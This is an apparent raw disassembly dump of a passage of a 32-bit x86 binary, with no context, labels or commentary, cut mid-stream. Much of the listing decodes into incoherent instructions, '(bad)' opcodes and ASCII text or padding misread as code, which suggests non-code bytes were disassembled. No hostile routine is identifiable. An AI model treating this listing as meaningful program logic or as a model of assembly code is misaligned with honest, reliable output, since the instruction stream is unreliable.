  40cd33:	push   ebx
  40cd34:	and    BYTE PTR ds:0x65676720,bh
  40cd3a:	jbe    0x40cd7d
  40cd3c:	jo     0x40cd9f
  40cd3e:	outs   dx,BYTE PTR ds:[esi]
  40cd3f:	jo     0x40cda6
  40cd41:	ds js  0x40cdad
  40cd44:	cs je  0x40cd81
  40cd47:	cs sub al,0x6d
  40cd4a:	jb     0x40cd74
  40cd4c:	ins    DWORD PTR es:[edi],dx
  40cd4d:	push   0x8b2be045
  40cd52:	mov    edi,DWORD PTR [esi]
  40cd54:	gs dec eax
  40cd56:	push   eax
  40cd57:	outs   dx,DWORD PTR ds:[esi]
  40cd58:	in     al,0xd8
  40cd5a:	push   ecx
  40cd5b:	push   ecx
  40cd5c:	xchg   DWORD PTR [edx-0x1e746c03],ebp
  40cd62:	pop    edx
  40cd63:	pusha  
  40cd64:	je     0x40cd2d
  40cd66:	xchg   esi,eax
  40cd67:	rcl    DWORD PTR [ebx-0x51ee3ca],1
  40cd6d:	jns    0x40cdcc
  40cd6f:	aam    0x12
  40cd71:	mov    edx,0xc1fd0c46
  40cd76:	mov    ecx,DWORD PTR [ebx-0x7474e7c6]
  40cd7c:	in     eax,0xe4
  40cd7e:	add    ecx,DWORD PTR [ebx+0x29b6e00]
  40cd84:	lock popa 
  40cd86:	mov    bl,0x54
  40cd88:	or     al,0x43
  40cd8a:	outs   dx,DWORD PTR ds:[esi]
  40cd8b:	mov    dl,0x1c
  40cd8d:	js     0x40cd6d
  40cd8f:	loope  0x40ce0d
  40cd91:	jno    0x40cdb5
  40cd93:	pop    es
  40cd94:	cmp    edx,0xf57f88
  40cd9a:	add    BYTE PTR [eax],al
  40cd9c:	mov    eax,ds:0x41bf1a0b
  40cda1:	push   ebx
  40cda2:	fsub   QWORD PTR gs:[ebx-0x757edf0d]
  40cda9:	xchg   ebx,eax
  40cdaa:	push   edi
  40cdab:	lahf   
  40cdac:	xchg   ebp,eax
  40cdad:	mov    edx,0x3dfaa0aa
  40cdb2:	in     al,0x34
  40cdb4:	push   0x68
  40cdb6:	mov    dl,0xb
  40cdb8:	outs   dx,BYTE PTR ds:[esi]
  40cdb9:	add    BYTE PTR [eax],al
  40cdbb:	sbb    ch,BYTE PTR [ecx]
  40cdbd:	sub    BYTE PTR [eax],al
  40cdbf:	add    BYTE PTR [eax],al
  40cdc1:	push   eax
  40cdc2:	push   eax
  40cdc3:	push   eax
  40cdc4:	push   eax
  40cdc5:	push   eax
  40cdc6:	push   eax
  40cdc7:	push   eax
  40cdc8:	push   eax
  40cdc9:	push   eax
  40cdca:	mov    ah,0x65
  40cdcc:	imul   ecx,DWORD PTR [ebx-0x74747475],0xffffff8b
  40cdd3:	mov    ecx,DWORD PTR [ebx-0x76f0f075]
  40cdd9:	stc    
  40cdda:	aad    0x7f
  40cddc:	js     0x40cd81
  40cdde:	and    al,0xe2
  40cde0:	cs call 0x7e9b:0xf9bc898
  40cde8:	pop    ebx
  40cde9:	loope  0x40ce3c
  40cdeb:	test   eax,0xff57567
  40cdf1:	(bad)  
  40cdf3:	jne    0x40ce04
  40cdf5:	movups xmm7,xmm1
  40cdf8:	(bad)  
  40cdf9:	maxps  xmm2,XMMWORD PTR [ebx+0xf]
  40cdfd:	not    ebx
  40cdff:	dec    ebx
  40ce00:	mov    al,0xc2
  40ce02:	pop    ax
  40ce04:	ret    
  40ce05:	cs mov cl,0x45
  40ce08:	inc    esi
  40ce09:	shl    DWORD PTR [eax+0xf],0x88
  40ce0d:	popa   
  40ce0e:	mov    es,WORD PTR [edi]
  40ce10:	pushf  
  40ce11:	or     BYTE PTR [edi],cl
  40ce13:	add    BYTE PTR [edi+0x1b],al
  40ce16:	(bad)  
  40ce17:	adc    DWORD PTR [eax],eax
  40ce19:	add    BYTE PTR [eax],al
  40ce1b:	mov    bh,0xa9
  40ce1d:	outs   dx,BYTE PTR ds:[esi]
  40ce1e:	je     0x40ce45
  40ce20:	dec    esp
  40ce21:	aam    0xf0
  40ce23:	jge    0x40ce61
  40ce25:	mov    ebp,0x472e426a
  40ce2a:	mov    eax,eax
  40ce2c:	inc    edi
  40ce2d:	mov    dh,0x99
  40ce2f:	or     al,0xfb
  40ce31:	adc    eax,0x80a3ace1
  40ce36:	mov    esp,0xb010735
  40ce3b:	std    
  40ce3c:	jle    0x40ce41
  40ce3e:	add    BYTE PTR [eax],al
  40ce40:	sub    esi,DWORD PTR [eax+eax*1+0x0]
	...
  40ce4c:	add    BYTE PTR [eax],al
  40ce4e:	inc    esp
  40ce4f:	cs out 0x0,al
	...
  40ce5a:	lea    ecx,[ebp+0x1d0e2c7e]
  40ce60:	add    al,0xa4
  40ce62:	mov    esp,0xd4241764
  40ce67:	rcl    DWORD PTR [eax+0x580f6f48],cl
  40ce6d:	ret    
  40ce6e:	fucomp st(0)
  40ce70:	sub    al,BYTE PTR [ecx+ebx*4-0x74]
  40ce74:	lea    ecx,[ebp+0xd2a147f]
  40ce7a:	dec    edx
  40ce7b:	mov    BYTE PTR [edx-0x52],cl
  40ce7e:	add    DWORD PTR [ebp-0x6e],0xffffffa2
  40ce82:	pop    ebp
  40ce83:	lock pushf 
  40ce85:	mov    esi,0x3d7ced0e
  40ce8a:	sahf   
  40ce8b:	sbb    al,0x38
  40ce8d:	rcr    DWORD PTR [ebx],1
  40ce8f:	neg    DWORD PTR [eax+ecx*4-0x5c72720e]
  40ce96:	xor    DWORD PTR [edi],ecx
  40ce98:	lea    ecx,[ebp-0x72e67db3]
  40ce9e:	mov    ebp,DWORD PTR [ebx-0x78]
  40cea1:	and    eax,0x3209edf8
  40cea6:	xor    al,BYTE PTR [ebp+0x2caa382b]
  40ceac:	imul   esp,DWORD PTR ss:[esi-0x27f95b7f],0x99d9daf
  40ceb7:	mov    ecx,DWORD PTR [ebx-0x743c3675]
  40cebd:	mov    edx,DWORD PTR [esi-0x74747462]
	...
  40cecb:	add    dl,al
  40cecd:	dec    esi
  40cece:	scas   al,BYTE PTR es:[edi]
  40cecf:	lea    edx,ds:0x907a9808
  40ced5:	mov    ds:0xdaad8653,al
  40ceda:	(bad)  
  40cedb:	mov    ah,0x3
  40cedd:	inc    ebp
  40cede:	mov    bh,0xbe
  40cee0:	not    DWORD PTR [edi]
  40cee2:	cmp    BYTE PTR [ebx-0x3f3f3f40],ah
  40cee8:	rol    al,0xc0
  40ceeb:	rol    al,0x24
  40ceee:	and    al,0xcc
  40cef0:	(bad)  
  40cef2:	loopne 0x40cf18
  40cef4:	and    al,0x20
  40cef6:	push   ds
  40cef7:	out    dx,al
  40cef8:	ret    0x4be4
  40cefb:	push   edi
  40cefc:	or     DWORD PTR [edx],0x17
  40ceff:	leave  
  40cf00:	ficomp DWORD PTR [ebp+eiz*8-0x2d]
  40cf04:	ins    BYTE PTR es:[edi],dx
  40cf05:	sub    dl,BYTE PTR [ecx+0x360560f2]
  40cf0b:	sub    BYTE PTR [edx-0x644a9f4c],0x28
  40cf12:	inc    eax
  40cf13:	pop    ebx
  40cf14:	jge    0x40cf78
  40cf16:	js     0x40cf24
  40cf18:	and    al,0x24
  40cf1a:	jb     0x40cf71
  40cf1c:	and    al,0x24
  40cf1e:	pop    ecx
  40cf1f:	inc    eax
  40cf20:	(bad)  
  40cf21:	and    al,0xcc
  40cf23:	std    
  40cf24:	ds jbe 0x40cf48
  40cf27:	scas   al,BYTE PTR es:[edi]
  40cf28:	int    0xd2
  40cf2a:	icebp  
  40cf2b:	out    dx,al
  40cf2c:	jl     0x40cf44
  40cf2e:	mov    ah,0x4b
  40cf30:	or     bh,ch
  40cf32:	and    eax,0x600a860f
  40cf37:	lock ss in al,0xef
  40cf3b:	int3   
  40cf3c:	int3   
  40cf3d:	int3   
  40cf3e:	in     al,dx
  40cf3f:	ficomp DWORD PTR [ebx*2+0x4ad4fa00]
  40cf46:	jmp    0x5604:0xab4c8357
  40cf4d:	loope  0x40cfa5
  40cf4f:	push   edx
  40cf50:	mov    bh,0x95
  40cf52:	cmp    eax,0xa50ec64c
  40cf57:	hlt    
  40cf58:	xchg   ecx,eax
  40cf59:	inc    edi
  40cf5a:	dec    ah
  40cf5c:	int3   
  40cf5d:	arpl   WORD PTR [esi-0x3333337f],bx
	...
  40cf6b:	add    BYTE PTR [ecx],ch
  40cf6d:	aas    
  40cf6e:	add    BYTE PTR gs:[eax],al
  40cf71:	add    BYTE PTR [eax],al
  40cf73:	add    BYTE PTR [eax],al
  40cf75:	add    BYTE PTR [eax],al
  40cf77:	add    BYTE PTR [ebp+0x45],al
  40cf7a:	lods   eax,DWORD PTR ds:[esi]
  40cf7b:	jo     0x40cf83
  40cf7d:	aam    0x7f
  40cf7f:	pop    ebp
  40cf80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf81:	scas   al,BYTE PTR es:[edi]
  40cf82:	sub    DWORD PTR [ebx],eax
  40cf84:	ss leave 
  40cf86:	mov    ecx,DWORD PTR [ecx-0x602b4960]
  40cf8c:	mov    WORD PTR [edx+0x4a822e18],?
  40cf92:	inc    ebp
  40cf93:	inc    ebp
  40cf94:	les    edi,FWORD PTR ds:0xc0224545
  40cf9a:	inc    ebp
  40cf9b:	inc    ebp
  40cf9c:	xchg   DWORD PTR [edi-0xf9624a4],ebp
  40cfa2:	mov    ecx,0x110a9c1f
  40cfa7:	imul   ebx,esi,0xaf4592a9
  40cfad:	xchg   ebp,eax
  40cfae:	into   
  40cfaf:	stos   DWORD PTR es:[edi],eax
  40cfb0:	fcom   st(3)
  40cfb2:	sub    eax,0xee004589
  40cfb7:	xor    DWORD PTR [edx+ebp*8-0x32000000],ebx
  40cfbe:	imul   esp,DWORD PTR [eax],0xffffffcd
  40cfc1:	cmc    
  40cfc2:	inc    ecx
  40cfc3:	outs   dx,DWORD PTR ds:[esi]
  40cfc4:	rcl    DWORD PTR [ecx],1
  40cfc6:	sbb    edx,0x1cd93c7e
  40cfcc:	jmp    0xd529:0x975f028c
  40cfd3:	(bad)  
  40cfd4:	repz loopne 0x40d053
  40cfd7:	cs dec esi
  40cfd9:	ins    DWORD PTR es:[edi],dx
  40cfda:	add    al,0x61
  40cfdc:	(bad)  
  40cfdd:	pop    esi
  40cfde:	inc    esp
  40cfdf:	xchg   ebp,eax
  40cfe0:	add    BYTE PTR [eax],al
  40cfe2:	popa   
  40cfe3:	in     eax,0x0
	...
  40cfed:	add    BYTE PTR [eax],al
  40cfef:	add    BYTE PTR [ecx],bh
  40cff1:	dec    ebp
  40cff2:	pop    esp
  40cff3:	jne    0x40d06a
  40cff5:	jne    0x40d06c
  40cff7:	jne    0x40d06e
  40cff9:	jne    0x40d070
  40cffb:	jne    0x40cffd
  40cffd:	add    BYTE PTR [ebx+0x32513af],bh
  40d003:	cwde   
  40d004:	or     al,0x84
  40d006:	fwait
  40d007:	mov    eax,0x38722a38
  40d00c:	xor    ecx,ecx
  40d00e:	call   0x7979:0x59a6a99e
  40d015:	je     0x40d017
  40d017:	add    BYTE PTR [edi],bl
  40d019:	loop   0x40d082
  40d01b:	lahf   
  40d01c:	fwait
  40d01d:	rol    DWORD PTR [ebx],1
  40d01f:	scas   al,BYTE PTR es:[edi]
  40d020:	enter  0x3af9,0x93
  40d024:	enter  0xb3dd,0x23
  40d028:	shl    BYTE PTR [esi],0x48
  40d02b:	nop
  40d02c:	sub    dh,BYTE PTR [eax]
  40d02e:	push   0x9325a05c
  40d033:	add    esi,DWORD PTR [ecx]
  40d035:	add    BYTE PTR [eax],al
  40d037:	fucomp st(4)
  40d039:	icebp  
  40d03a:	add    BYTE PTR [eax],al
  40d03c:	mov    edx,0x800c100
  40d041:	ins    DWORD PTR es:[edi],dx
  40d042:	cmp    eax,DWORD PTR [ecx+edi*1-0x774092a3]
  40d049:	or     DWORD PTR ds:0x53b9b77a,esi
  40d04f:	pushf  
  40d050:	pop    ds
  40d051:	frstor [esi+edx*4]
  40d054:	div    DWORD PTR [edi-0x17]
  40d057:	scas   eax,DWORD PTR es:[edi]
  40d058:	out    dx,eax
  40d059:	or     BYTE PTR [eax],cl
  40d05b:	or     BYTE PTR [edi+eax*4+0x8],ah
  40d05f:	or     BYTE PTR [edi+edi*4+0x8],bh
  40d063:	or     BYTE PTR [eax],cl
  40d065:	int3   
  40d066:	int3   
  40d067:	int3   
  40d068:	int3   
  40d069:	int3   
  40d06a:	int3   
  40d06b:	int3   
  40d06c:	int3   
  40d06d:	int3   
  40d06e:	xor    ebx,DWORD PTR [edi]
  40d070:	jmp    0x724c87cc
  40d075:	cmp    al,0xe5
  40d077:	idiv   BYTE PTR [edx]
  40d079:	test   edx,ecx
  40d07b:	out    0xb4,al
  40d07d:	and    al,0xa9
  40d07f:	scas   al,BYTE PTR es:[edi]
  40d080:	call   0x57fbf27
  40d085:	aaa    
  40d086:	add    al,0x4
  40d088:	add    al,0x4
  40d08a:	add    al,0x4
  40d08c:	add    al,0x4
  40d08e:	add    al,0xff
  40d090:	jmp    FWORD PTR [ebp-0x9]
  40d093:	std    
  40d094:	jns    0x40d095
  40d096:	(bad)  
  40d097:	(bad)  
  40d098:	jmp    0x42926a8a
  40d09d:	push   eax
  40d09e:	mov    eax,0xbd23db43
  40d0a3:	mov    dl,0x56
  40d0a5:	pop    ebp
  40d0a6:	xchg   ebx,eax
  40d0a7:	in     eax,0x4e
  40d0a9:	sub    BYTE PTR [eax+0x6922db91],ah
  40d0af:	mov    dl,0xa4
  40d0b1:	mov    cl,BYTE PTR [ebx+0x5117ec42]
  40d0b7:	mov    ds:0xfffff9f7,al
  40d0bc:	icebp  
  40d0bd:	jge    0x40d0be
  40d0bf:	call   DWORD PTR [esi+0xffa61a]
  40d0c5:	pushf  
  40d0c6:	fldenv [edx-0x2e368560]
  40d0cc:	in     eax,0x60
  40d0ce:	cwde   
  40d0cf:	pop    es
  40d0d0:	test   dl,dl
  40d0d2:	ret    
  40d0d3:	xchg   edi,eax
  40d0d4:	les    eax,FWORD PTR [ecx]
  40d0d6:	jmp    0x40d11c
  40d0d8:	inc    ebx
  40d0d9:	aam    0x48
  40d0db:	syscall 
  40d0dd:	add    BYTE PTR [eax],al
  40d0df:	add    ch,ch
  40d0e1:	jbe    0x40d0db
  40d0e3:	or     eax,0x2e6d7220
  40d0e8:	push   ebx
  40d0e9:	jb     0x40d10b
  40d0eb:	outs   dx,BYTE PTR ds:[esi]
  40d0ec:	ins    BYTE PTR es:[edi],dx
  40d0ed:	data16 and BYTE PTR [edx+0x6c],dh
  40d0f1:	and    BYTE PTR [edi+0x76],ch
  40d0f4:	push   eax
  40d0f5:	push   eax
  40d0f6:	popa   
  40d0f7:	popa   
  40d0f8:	outs   dx,DWORD PTR ds:[esi]
  40d0f9:	je     0x40d16b
  40d0fb:	outs   dx,DWORD PTR ds:[esi]
  40d0fc:	cmp    al,0x6c
  40d0fe:	bound  edi,QWORD PTR [esi+eiz*2]
  40d101:	ins    DWORD PTR es:[edi],dx
  40d102:	imul   esp,DWORD PTR [ebp+ebp*2+0x65],0x74
  40d107:	sub    al,0x68
  40d109:	das    
  40d10a:	bound  eax,QWORD PTR gs:[ecx+0x6d]
  40d10e:	ins    DWORD PTR es:[edi],dx
  40d10f:	imul   ebp,DWORD PTR [edi+0x72],0x632e2e65
  40d116:	dec    ebp
  40d117:	jbe    0x40d188
  40d119:	jo     0x40d188
  40d11b:	gs jae 0x40d15c
  40d11e:	cs popa 
  40d120:	or     ah,BYTE PTR [eax]
  40d122:	jb     0x40d189
  40d124:	jb     0x40d148
  40d126:	imul   esi,DWORD PTR [esi+0x6e],0x53506d2f
  40d12d:	bound  eax,QWORD PTR [esi+edi*1+0x2e]
  40d131:	ins    DWORD PTR es:[edi],dx
  40d132:	push   eax
  40d133:	jae    0x40d1a8
  40d135:	gs inc ecx
  40d137:	arpl   WORD PTR [esp+esi*2+0x53],si
  40d13b:	ins    DWORD PTR es:[edi],dx
  40d13c:	bound  esi,QWORD PTR gs:[esi+0x2e]
  40d140:	push   eax
  40d141:	ins    DWORD PTR es:[edi],dx
  40d142:	je     0x40d1a9
  40d144:	gs gs jb 0x40d1b7
  40d148:	inc    ebx
  40d149:	jae    0x40d1b8
  40d14b:	and    BYTE PTR [ebp+ebp*2+0x6f],dh
  40d14f:	and    ah,BYTE PTR cs:[eax]
  40d152:	fld    QWORD PTR [ebx+0x1acd65e]
  40d158:	cwde   
  40d159:	pop    edi
  40d15a:	sti    
  40d15b:	sbb    DWORD PTR [esi+0x18],eax
  40d15e:	jecxz  0x40d1d6
  40d160:	mov    al,ds:0x35f53
  40d165:	adc    eax,0xf1ac486b
  40d16a:	jl     0x40d15f
  40d16c:	add    BYTE PTR [eax],al
  40d16e:	add    ch,BYTE PTR [eax+edx*4]
	...
  40d17d:	cmovg  ecx,ecx
  40d180:	jne    0x40d1f7
  40d182:	jne    0x40d1f9
  40d184:	jne    0x40d1fb
  40d186:	jne    0x40d1fd
  40d188:	jne    0x40d1ff
  40d18a:	jne    0x40d1a5
  40d18c:	mov    al,ds:0x5edd39bb
  40d191:	adc    al,0xb1
  40d193:	jmp    0x40d156
  40d195:	out    dx,al
  40d196:	mov    BYTE PTR [ecx+0x69],ch
  40d199:	xchg   ebp,eax
  40d19a:	sar    esp,cl
  40d19c:	psllw  mm7,QWORD PTR [edx+0x25]
  40d1a0:	adc    BYTE PTR [edi+edi*8],0x75
  40d1a4:	jne    0x40d1ee
  40d1a6:	aas    
  40d1a7:	jne    0x40d21e
  40d1a9:	jae    0x40d176
  40d1ab:	jne    0x40d222
  40d1ad:	pop    esi
  40d1ae:	add    al,0x36
  40d1b0:	cmp    al,0x93
  40d1b2:	pop    ecx
  40d1b3:	mov    esi,0x56a5c421
  40d1b8:	mov    ebx,0x3480cefa
  40d1bd:	or     al,0x6b
  40d1bf:	sbb    eax,0xc8d5c48f
  40d1c4:	and    esi,DWORD PTR [ebp+0x8]
  40d1c7:	and    esi,DWORD PTR [esi+0x80847c0]
  40d1cd:	or     ch,dl
  40d1cf:	dec    edi
  40d1d0:	cmp    esp,DWORD PTR ds:0x176627b7
  40d1d6:	pop    ebp
  40d1d7:	dec    eax
  40d1d8:	mov    ds:0xefac8e34,eax
  40d1dd:	pop    es
  40d1de:	and    esi,DWORD PTR [eax+0x3529ba5a]
  40d1e4:	dec    esp
  40d1e5:	ins    BYTE PTR es:[edi],dx
  40d1e6:	in     al,0x9f
  40d1e8:	inc    esi
  40d1e9:	lock sub DWORD PTR [ecx-0x2a397a16],edi
  40d1f0:	mov    al,0x8
  40d1f2:	or     BYTE PTR [edx+0x9],dl
  40d1f5:	or     BYTE PTR [eax],cl
  40d1f7:	or     BYTE PTR [esp+eax*1],al
  40d1fa:	add    al,0x4
  40d1fc:	add    al,0x4
  40d1fe:	add    al,0x4
  40d200:	add    al,0x8
  40d202:	mov    ah,0x27
	...
  40d20c:	add    BYTE PTR [ebp-0x3b2ba473],cl
  40d212:	add    BYTE PTR [esi+0x1b],dh
  40d215:	cdq    
  40d216:	call   0x4985:0xbec7603c
  40d21d:	imul   esp,DWORD PTR [ebx-0x26],0xffffff88
  40d221:	inc    edx
  40d222:	dec    edx
  40d223:	js     0x40d249
  40d225:	das    
  40d226:	inc    eax
  40d227:	lea    ecx,[ebp-0x3cb314a7]
  40d22d:	aas    
  40d22e:	(bad)  
  40d230:	stos   BYTE PTR es:[edi],al
  40d231:	sub    al,0xb4
  40d233:	inc    ecx
  40d234:	ret    0xbb08
  40d237:	xlat   BYTE PTR ds:[ebx]
  40d238:	and    al,0xc1
  40d23a:	cmp    dl,BYTE PTR [ebx-0x7f1a3976]
  40d240:	xchg   DWORD PTR [eax+ebp*1-0x46],esi
  40d244:	sbb    eax,0x618d8db8
  40d249:	mov    dh,0x60
  40d24b:	lea    ecx,[ebp-0x72291a04]
  40d251:	add    BYTE PTR [esi+0x5d],dh
  40d254:	or     DWORD PTR [eax],ecx
  40d256:	jle    0x40d229
  40d258:	div    DWORD PTR [ebx]
  40d25a:	loope  0x40d230
  40d25c:	fcom   DWORD PTR [edx+0x40bdb38]
  40d262:	shr    bh,cl
  40d264:	mov    ds:0x4e8fa529,al
  40d269:	pop    DWORD PTR [eax]
  40d26b:	add    BYTE PTR [eax],al
  40d26d:	xor    al,0x25
  40d26f:	add    BYTE PTR [eax],al
  40d271:	xor    eax,0x27
	...
  40d27e:	add    BYTE PTR [ebx-0x29],al
  40d281:	mov    cl,0xd7
  40d283:	xchg   ebx,eax
  40d284:	cmp    ebp,0xd3cffb36
  40d28a:	in     eax,0x2f
  40d28c:	cmp    bl,BYTE PTR [edx]
  40d28e:	push   ebp
  40d28f:	dec    edx
  40d290:	das    
  40d291:	push   0x59c0dc98
  40d296:	loop   0x40d21b
  40d298:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  40d29f:	add    DWORD PTR [eax],0x0
  40d2a2:	push   ss
  40d2a3:	int3   
  40d2a4:	or     edx,ecx
  40d2a6:	add    BYTE PTR [eax],al
  40d2a8:	sbb    ebx,DWORD PTR [esi]
  40d2aa:	mov    eax,ds:0x4a1f71fe
  40d2af:	lods   eax,DWORD PTR ds:[esi]
  40d2b0:	inc    edi
  40d2b1:	xor    DWORD PTR [ebx-0x64],edx
  40d2b4:	ja     0x40d2ad
  40d2b6:	or     al,dl
  40d2b8:	inc    ecx
  40d2b9:	hlt    
  40d2ba:	dec    esp
  40d2bb:	jno    0x40d28e
  40d2bd:	and    ax,0xb975
  40d2c1:	pop    esp
  40d2c2:	xchg   edi,eax
  40d2c3:	mov    dh,cl
  40d2c5:	jns    0x40d24c
  40d2c7:	dec    esi
  40d2c8:	mov    al,ds:0xaa08
  40d2cd:	scas   eax,DWORD PTR es:[edi]
  40d2ce:	mov    DWORD PTR [eax],eax
  40d2d0:	add    BYTE PTR [edi*2-0x417ff68],al
  40d2d7:	inc    esp
  40d2d8:	fwait
  40d2d9:	push   eax
  40d2da:	sahf   
  40d2db:	mov    DWORD PTR [eax],edx
  40d2dd:	test   DWORD PTR [ebx-0x4d],esp
  40d2e0:	(bad)
  40d2e4:	mov    fs,WORD PTR [ebx+0x357aa6db]
  40d2ea:	(bad)  
  40d2eb:	sbb    edx,DWORD PTR [edx-0x17171765]
  40d2f1:	ins    DWORD PTR es:[edi],dx
  40d2f2:	imul   edx,DWORD PTR [edx+0x56b2a6e8],0x171c7435
  40d2fc:	mov    al,0xe7
  40d2fe:	loopne 0x40d33d
  40d300:	mov    ch,0x3f
  40d302:	xor    dh,dl
  40d304:	xchg   DWORD PTR [esi+esi*2+0x52],eax
  40d308:	mov    esp,0x3319305b
  40d30d:	pop    ss
  40d30e:	call   0xb44fd1fb
  40d313:	call   0x41bc00
  40d318:	add    BYTE PTR [eax],al
  40d31a:	add    BYTE PTR [eax],al
  40d31c:	add    BYTE PTR [eax],al
  40d31e:	add    BYTE PTR [ebx+esi*2],ah
  40d321:	jmp    0x40d323
	...
  40d32b:	add    BYTE PTR [eax],al
  40d32d:	into   
  40d32e:	clc    
  40d32f:	and    DWORD PTR [ecx+0x6f],ebp
  40d332:	stc    
  40d333:	frstor [di]
  40d336:	rol    bl,cl
  40d338:	cmc    
  40d339:	cmp    eax,0xd71def9e
  40d33e:	lods   al,BYTE PTR ds:[esi]
  40d33f:	xor    BYTE PTR ds:0x230a313e,dl
  40d345:	add    BYTE PTR [eax],al
  40d347:	mov    esp,0x1700004c
  40d34c:	push   edx
  40d34d:	add    BYTE PTR [eax],al
  40d34f:	sub    ebx,0xffffff87
  40d352:	or     al,0x8d
  40d354:	sti    
  40d355:	jbe    0x40d314
  40d357:	ror    BYTE PTR [edi-0x33],1
  40d35a:	pop    DWORD PTR [esi+0xb]
  40d35d:	ins    BYTE PTR es:[edi],dx
  40d35e:	mov    edx,0xad04234b
  40d363:	cdq    
  40d364:	jmp    0x40d3a2
  40d366:	lahf   
  40d367:	add    al,ch
  40d369:	jmp    0xe8cb7fe1
  40d36e:	call   0xa534fd5b
  40d373:	cli    
  40d374:	inc    ebp
  40d375:	test   al,0xa8
  40d377:	fisub  WORD PTR [eax]
  40d379:	or     dl,ah
  40d37b:	inc    esi
  40d37c:	and    DWORD PTR [ebp-0x2f],ebp
  40d37f:	add    al,0x4
  40d381:	inc    ebp
  40d382:	cmp    al,0xfe
  40d384:	je     0x40d34e
  40d386:	dec    edi
  40d387:	leave  
  40d388:	xchg   ebx,eax
  40d389:	add    eax,0x18e92622
  40d38e:	out    0x1e,eax
  40d390:	lds    ebx,FWORD PTR [ecx+0x68]
  40d393:	call   0xe9309b80
  40d398:	call   0x74b54885
  40d39d:	je     0x40d413
  40d39f:	je     0x40d415
  40d3a1:	je     0x40d417
  40d3a3:	dec    BYTE PTR [edx-0xb4]
  40d3a9:	(bad)  
  40d3aa:	(bad)  
  40d3ab:	(bad)  
  40d3ac:	(bad)  
  40d3ad:	(bad)  
  40d3ae:	inc    eax
  40d3b0:	rol    BYTE PTR [edx-0x165b5c73],0xad
  40d3b7:	sub    al,0x8b
  40d3b9:	mov    eax,ds:0xf3d7b4dc
  40d3be:	jmp    0xc03d:0xbe630a25
  40d3c5:	jnp    0x40d41c
  40d3c7:	mov    edx,0xbac0c035
  40d3cc:	mov    fs,WORD PTR [ebx+edi*4+0x3fe14e54]
  40d3d3:	mov    esi,0x84f40f18
  40d3d8:	mov    edi,0xc67d9fa8
  40d3dd:	push   edx
  40d3de:	push   esi
  40d3df:	mov    dh,BYTE PTR [ebp+0x2a]
  40d3e2:	cli    
  40d3e3:	dec    eax
  40d3e4:	out    0x72,eax
  40d3e6:	dec    DWORD PTR [ebp+0x4521c0c0]
  40d3ec:	ss rol al,0x7d
  40d3f0:	sti    
  40d3f1:	fadd   st(0),st
  40d3f3:	add    ah,bh
  40d3f5:	push   cs
  40d3f6:	mov    esp,0xd0642ae6
  40d3fb:	in     eax,0x72
  40d3fd:	or     eax,0x3daf0c12
  40d402:	sub    bh,BYTE PTR [ecx+0x66f6de6f]
  40d408:	adc    eax,0x4b80f6
  40d40d:	add    BYTE PTR [eax],al
  40d40f:	fucomip st,st(4)
  40d411:	add    BYTE PTR [eax],al
  40d413:	mov    dh,0x50
  40d415:	add    BYTE PTR [eax],al
  40d417:	add    BYTE PTR [eax+0x50],dl
  40d41a:	push   eax
  40d41b:	push   eax
  40d41c:	push   eax
  40d41d:	push   eax
  40d41e:	push   eax
  40d41f:	push   eax
  40d420:	push   eax
  40d421:	ret    
  40d422:	xcrypt-ofb (bad)
  40d423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d424:	sub    al,0x22
  40d426:	enter  0x2bd4,0xba
  40d42a:	pop    ebp
  40d42b:	out    dx,eax
  40d42c:	je     0x40d470
  40d42e:	arpl   WORD PTR ds:0x9f7eaee0,bx
  40d434:	lds    ebx,FWORD PTR ds:0x75ed5b01
  40d43a:	jne    0x40d4b1
  40d43c:	jne    0x40d4b3
  40d43e:	jne    0x40d4b5
  40d440:	jne    0x40d4b7
  40d442:	add    BYTE PTR [eax],al
  40d444:	fild   WORD PTR [edx]
  40d446:	fdivr  QWORD PTR [ecx]
  40d448:	add    BYTE PTR [eax],al
  40d44a:	jg     0x40d40b
  40d44c:	test   DWORD PTR [ebp-0x34],0x9daac179
  40d453:	idiv   DWORD PTR [edx+ebp*2]
  40d456:	mov    esi,0x1d9f0e87
  40d45b:	pop    ecx
  40d45c:	movaps XMMWORD PTR [ecx],xmm0
  40d45f:	frstor [edi+eax*8+0x7a6428cb]
  40d466:	mov    WORD PTR [edi+eax*8],fs
  40d469:	stc    
  40d46a:	mov    DWORD PTR [edx],esi
  40d46c:	call   0x0:0xbfce0000
  40d473:	mov    ebp,0x740045c1
  40d478:	pushf  
  40d479:	cmc    
  40d47a:	(bad)  
  40d47b:	bound  edx,QWORD PTR [edi-0x7735d36d]
  40d481:	rcl    BYTE PTR [eax],cl
  40d483:	pop    ds
  40d484:	sub    al,0xde
  40d486:	stos   DWORD PTR es:[edi],eax
  40d487:	mov    edx,0xc8ce8fe2
  40d48c:	call   0x7474:0x74794f26
  40d493:	and    al,0x3c
  40d495:	jb     0x40d509
  40d497:	imul   edi,DWORD PTR [ebx+eiz*2],0x72536370
  40d49e:	popa   
  40d49f:	gs popa 
  40d4a1:	jb     0x40d4b0
  40d4a3:	jae    0x40d519
  40d4a5:	sub    BYTE PTR gs:[ebp+0x6e],dh
  40d4a9:	or     bh,BYTE PTR [ecx+0x73]
  40d4ac:	bound  esi,QWORD PTR [edx+0x62]
  40d4af:	ins    DWORD PTR es:[edi],dx
  40d4b0:	ins    DWORD PTR es:[edi],dx
  40d4b1:	imul   eax,DWORD PTR [esp+ebp*1+0x6f],0x3e
  40d4b6:	bound  ebp,QWORD PTR [edi+0x65]
  40d4b9:	imul   esp,DWORD PTR [ecx+0x4e],0x734d4169
  40d4c0:	je     0x40d4fe
  40d4c2:	outs   dx,DWORD PTR gs:[esi]
  40d4c4:	and    BYTE PTR ds:0x69693c20,cl
  40d4ca:	and    BYTE PTR [edx+0x2e],dh
  40d4cd:	cmp    ah,BYTE PTR [eax]
  40d4cf:	outs   dx,BYTE PTR ds:[esi]
  40d4d0:	ins    DWORD PTR es:[edi],dx
  40d4d1:	imul   ebp,DWORD PTR [esi],0x226e6372
  40d4d7:	and    BYTE PTR [esi],bh
  40d4d9:	jbe    0x40d4fb
  40d4db:	jae    0x40d4e7
  40d4dd:	and    BYTE PTR [ebp+0x3c],ch
  40d4e0:	jbe    0x40d555
  40d4e2:	outs   dx,BYTE PTR ds:[esi]
  40d4e3:	ins    DWORD PTR es:[edi],dx
  40d4e4:	jo     0x40d552
  40d4e6:	imul   eax,DWORD PTR [ebx+0x3c],0x736d706d
  40d4ed:	popa   
  40d4ee:	ds inc edx
  40d4f0:	cmp    al,0x20
